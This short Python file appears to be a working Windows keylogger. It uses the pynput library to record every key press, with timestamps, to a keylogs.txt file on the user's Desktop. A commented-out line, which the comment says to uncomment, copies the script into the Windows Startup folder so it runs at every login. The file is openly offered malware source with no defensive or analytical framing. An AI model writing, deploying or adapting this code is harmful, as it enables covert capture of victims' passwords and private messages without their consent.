from pynput.keyboard import Listener
from shutil import copyfile

import os
import logging

# Gets username from PC

username = os.getlogin()

# Makes logging directory and makes the logging basic config

logging_directory = f"C:/Users/{username}/Desktop"
logging.basicConfig(filename=f"{logging_directory}/keylogs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Moves python file to the startup folder

#Remove this comment to use this. copyfile('main.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py') 

# Key Logging

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()
